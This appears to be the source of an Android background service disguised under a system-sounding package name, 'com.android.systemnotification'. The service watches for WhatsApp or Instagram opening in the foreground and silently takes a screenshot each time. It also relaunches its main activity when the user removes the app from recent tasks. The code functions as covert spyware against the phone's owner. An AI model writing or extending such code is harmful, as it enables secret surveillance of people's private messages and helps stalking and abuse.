package com.android.systemnotification.utils;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

import com.android.systemnotification.MainActivity;
import com.rvalerio.fgchecker.AppChecker;

import androidx.annotation.Nullable;

public class BackgroundService extends Service /*implements ConnectivityReceiverForXMPP.ConnectivityReceiverListener*/ {
    private final String TAG = BackgroundService.class.getSimpleName();

    AppChecker appChecker;
    AppChecker appChecker2;

    public BackgroundService(){

    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent){
        return null;
    }

    @Override
    public void onCreate(){
        super.onCreate();
        Log.d(TAG, "onCreate()");

        start();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId){
        Log.d(TAG, "onStartCommand()");

        start();
        return Service.START_NOT_STICKY;
        //Returning START_STICKY causes code to stick around when app activity has died.
    }

    @Override
    public void onDestroy(){
        Log.d(TAG, "onDestroy()");
        super.onDestroy();

        appChecker = null;
        appChecker2 = null;
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        Log.e("ClearFromRecentService", "END");

        appChecker = null;
        appChecker2 = null;
        Intent newIntent = new Intent(this, MainActivity.class);
        startActivity(newIntent);
    }

    public void start(){

        try {
            Intent myService = new Intent(this, ForegroundService.class);
            stopService(myService);
        }
        catch (Exception e){
            e.printStackTrace();
        }

        if (appChecker == null) {
            Log.d(TAG, "Process Monitor initiated");

            appChecker = new AppChecker();
            appChecker.when("com.whatsapp", new AppChecker.Listener() {
                @Override
                public void onForeground(String process) {
                    Log.d(TAG, process + " is running");
                    ScreenshotManager.INSTANCE.takeScreenshot(BackgroundService.this);
                }
            }).timeout(10000).start(this);

            appChecker2 = new AppChecker();
            appChecker2.when("com.instagram.android", new AppChecker.Listener() {
                @Override
                public void onForeground(String process) {
                    Log.d(TAG, process + " is running");
                    ScreenshotManager.INSTANCE.takeScreenshot(BackgroundService.this);
                }
            }).timeout(11000).start(this);

        }
    }
}
